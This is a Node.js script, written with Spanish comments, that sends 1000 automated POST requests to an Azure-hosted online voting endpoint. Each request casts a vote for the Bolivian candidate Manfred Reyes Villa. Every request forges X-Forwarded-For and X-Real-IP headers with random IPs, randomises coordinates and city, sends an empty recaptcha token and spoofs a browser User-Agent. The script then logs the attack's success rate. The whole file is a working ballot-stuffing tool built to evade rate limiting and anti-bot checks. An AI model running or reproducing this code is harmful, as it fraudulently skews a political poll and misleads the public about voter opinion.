import https from "https";
import fs from "fs";
import { faker } from "@faker-js/faker";

const cities = JSON.parse(fs.readFileSync("./city.json", "utf-8")).data;

const timestamp = new Date().getTime();
const reportFile = `reporte-${timestamp}.json`;

const reporteCompleto = {
  metadata: {
    inicio: new Date().toISOString(),
    totalSolicitudes: 1000,
  },
  solicitudes: [],
  estadisticas: {
    exitosas: 0,
    fallidas: 0,
    tasaExito: "0%",
  },
};

// Función para obtener una ciudad aleatoria
function getRandomCity() {
  return cities[Math.floor(Math.random() * cities.length)];
}

// Función para realizar una solicitud POST
async function realizarSolicitud(numeroSolicitud) {
  return new Promise((resolve, reject) => {
    const fakeIp = faker.internet.ipv4(); // Generar IP aleatoria
    const coords = {
      lat: faker.number.float({ min: -22.9, max: -9.6, precision: 0.000001 }),
      lng: faker.number.float({ min: -69.5, max: -57.5, precision: 0.000001 }),
    };
    const ciudad = getRandomCity(); // Obtener ciudad aleatoria

    const params = new URLSearchParams({
      latitud: coords.lat,
      longitud: coords.lng,
      recapicha_token: "",
      pals: "Bolivia",
      ciudad,
      candidato: "Manfred+Reyes+Villa",
    });

    const opciones = {
      hostname:
        "segunda-votacion-daebgzdjhfc5fjbd.centralus-01.azurewebsites.net",
      path: "/enviar_voto_modificado_final",
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(params.toString()),
        "X-Forwarded-For": fakeIp,
        "X-Real-IP": fakeIp,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        Accept: "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9",
      },
      timeout: 15000, // Tiempo de espera de 15 segundos
    };

    const req = https.request(opciones, (res) => {
      let datos = "";

      res.on("data", (chunk) => {
        datos += chunk;
      });

      res.on("end", () => {
        const resultado = {
          numeroSolicitud,
          protocolo: "HTTPS",
          codigoRespuesta: res.statusCode,
          encabezados: res.headers,
          cuerpo: datos,
          exito: res.statusCode >= 200 && res.statusCode < 300,
          timestamp: new Date().toISOString(),
        };

        // Registrar en el reporte
        reporteCompleto.solicitudes.push(resultado);

        if (resultado.exito) {
          reporteCompleto.estadisticas.exitosas++;
        } else {
          reporteCompleto.estadisticas.fallidas++;
        }

        console.log(
          `Solicitud #${numeroSolicitud}: Protocolo=${resultado.protocolo}, Código=${resultado.codigoRespuesta}, Éxito=${resultado.exito}`
        );

        resolve(resultado);
      });
    });

    req.on("error", (error) => {
      const resultadoError = {
        numeroSolicitud,
        protocolo: "HTTPS",
        codigoRespuesta: null,
        encabezados: null,
        cuerpo: null,
        error: error.message,
        exito: false,
        timestamp: new Date().toISOString(),
      };

      // Registrar en el reporte
      reporteCompleto.solicitudes.push(resultadoError);
      reporteCompleto.estadisticas.fallidas++;

      console.error(`Solicitud #${numeroSolicitud}: Error=${error.message}`);

      reject(error);
    });

    req.setTimeout(15000, () => {
      const resultadoTimeout = {
        numeroSolicitud,
        protocolo: "HTTPS",
        codigoRespuesta: null,
        encabezados: null,
        cuerpo: null,
        error: "Timeout",
        exito: false,
        timestamp: new Date().toISOString(),
      };

      // Registrar en el reporte
      reporteCompleto.solicitudes.push(resultadoTimeout);
      reporteCompleto.estadisticas.fallidas++;

      console.error(`Solicitud #${numeroSolicitud}: Error=Timeout`);

      req.destroy();
      reject(new Error("Timeout"));
    });

    req.write(params.toString());
    req.end();
  });
}

// Función principal para ejecutar las solicitudes
async function ejecutarSolicitudes() {
  console.log("Iniciando proceso de solicitudes...");

  for (let i = 1; i <= 1000; i++) {
    try {
      await realizarSolicitud(i);
    } catch (error) {
      console.error(`Error en la solicitud #${i}: ${error.message}`);
    }

    // Guardar el reporte después de cada solicitud
    fs.writeFileSync(reportFile, JSON.stringify(reporteCompleto, null, 2));
  }

  // Calcular estadísticas finales
  reporteCompleto.metadata.fin = new Date().toISOString();
  reporteCompleto.metadata.duracion = `${
    new Date(reporteCompleto.metadata.fin) -
    new Date(reporteCompleto.metadata.inicio)
  }ms`;

  reporteCompleto.estadisticas.tasaExito = `${(
    (reporteCompleto.estadisticas.exitosas /
      reporteCompleto.metadata.totalSolicitudes) *
    100
  ).toFixed(2)}%`;

  // Guardar el reporte final
  fs.writeFileSync(reportFile, JSON.stringify(reporteCompleto, null, 2));

  console.log("\n===== PROCESO COMPLETADO =====");
  console.log(
    `Total de solicitudes: ${reporteCompleto.metadata.totalSolicitudes}`
  );
  console.log(`Solicitudes exitosas: ${reporteCompleto.estadisticas.exitosas}`);
  console.log(`Solicitudes fallidas: ${reporteCompleto.estadisticas.fallidas}`);
  console.log(`Tasa de éxito: ${reporteCompleto.estadisticas.tasaExito}`);
  console.log(`Reporte guardado en: ${reportFile}`);
}

ejecutarSolicitudes();
